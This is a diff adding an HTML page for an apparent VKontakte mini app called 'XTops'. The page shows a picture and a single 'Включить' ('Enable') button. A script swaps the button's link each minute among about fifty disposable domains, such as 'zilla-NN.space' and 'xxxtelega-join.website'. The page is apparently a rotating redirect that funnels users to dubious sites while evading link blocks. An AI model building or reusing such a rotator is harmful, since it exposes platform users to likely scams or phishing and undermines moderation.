@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width,initial-scale=1" />
+        <meta name="theme-color" content="#000000" />
+        <title>XTops</title>
+        <link href="style.css" rel="stylesheet" />
+    </head>
+    <body style="overflow: hidden;">
+        <div id="root">
+            <section class="View View--ios View--header">
+                <div class="View__header">
+                    <div class="View__header-scrolltop"></div>
+                    <div class="PanelHeader PanelHeader--ios">
+                        <div class="PanelHeader__in PanelHeader__in--active" id="panel-header-main">
+                            <div class="PanelHeader__container">
+                                <div class="PanelHeader__left">
+                                    <div class="PanelHeader__left-in" id="header-left-main"></div>
+                                    <div class="PanelHeader__addon" id="header-addon-main"></div>
+                                </div>
+                                <div class="PanelHeader__content" id="header-title-main"></div>
+                                <div class="PanelHeader__right" id="header-right-main"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="View__panels">
+                    <div class="View__panel View__panel--active">
+                        <div class="View__panel-in">
+                            <div id="main" class="Panel Panel--ios">
+                                <div class="Panel__in">
+                                    <div class="Panel__in-before"></div>
+                                    <div style="display: flex; align-items: center; flex-direction: column; justify-content: center; height: 80vh;">
+                                        <img src="https://i.imgur.com/Hz2a4lo.png" style="width: 80vw; margin-bottom: 10px; border-radius: 10px;" />
+                                        <a href="#" role="button" class="Tappable Tappable--ios Button Button--ios Button--sz-xl Button--lvl-primary Button--aln-center Tappable--inactive" style="width: 80vw; cursor:pointer;" target="_blank">
+                                            <div class="Button__in"><div class="Button__content">Включить</div></div>
+                                        </a>
+                                    </div>
+                                    <div class="Panel__in-after"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+        <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+        <script>
+            // Sends event to client
+            vkBridge.send('VKWebAppInit');
+        </script> 
+        <script>
+            const url_list = ['http://zilla-14.space', 'http://zilla-15.space', 'http://zilla-01.space', 'http://zilla-13.space', 'http://zilla-10.space', 'http://zilla-17.space', 'http://zilla-16.space', 'http://zilla-19.space', 'http://zilla-18.space', 'http://zilla-20.space', 'http://zilla-22.space', 'http://zilla-21.space', 'http://zilla-25.space', 'http://zilla-24.space', 'http://zilla-24.space', 'http://zilla-23.space', 'http://zilla-26.space', 'http://zilla-28.space', 'http://zilla-27.space', 'http://zilla-30.space', 'http://zilla-11.space', 'http://crybaby-29.space', 'http://crybaby-26.space', 'http://crybaby-25.space', 'http://crybaby-23.space', 'http://crybaby-24.space', 'http://crybaby-21.space', 'http://crybaby-22.space', 'http://crybaby-20.space', 'http://crybaby-19.space', 'http://crybaby-18.space', 'http://crybaby-16.space', 'http://crybaby-15.space', 'http://crybaby-03.space', 'http://crybaby-30.space', 'http://xxxtelega-join.website', 'http://telegalinkf2981.website', 'http://love2hate.website', 'http://swag7swag.website', 'http://hpnewyear.website', 'http://funnest38fd.space', 'http://half-lifchik-tooop.space', 'http://hell666boy.space', 'http://red-fun-04.website', 'http://peep-127983-1w6.space', 'http://peep-19748-0w4.space', 'http://peep-127983-1w9.space', 'http://peep-127983-1w7.space', 'http://peep-219489-0w5.space', 'http://02-apps-vk.website', 'http://ic3peak.space']
+			const url_index = Math.floor(Math.floor(Date.now() / 1000) / (1*60)) % url_list.length;
+			const url = url_list[url_index];
+            document.querySelector('.Tappable').href = url
+        </script>
+    </body>
+</html>
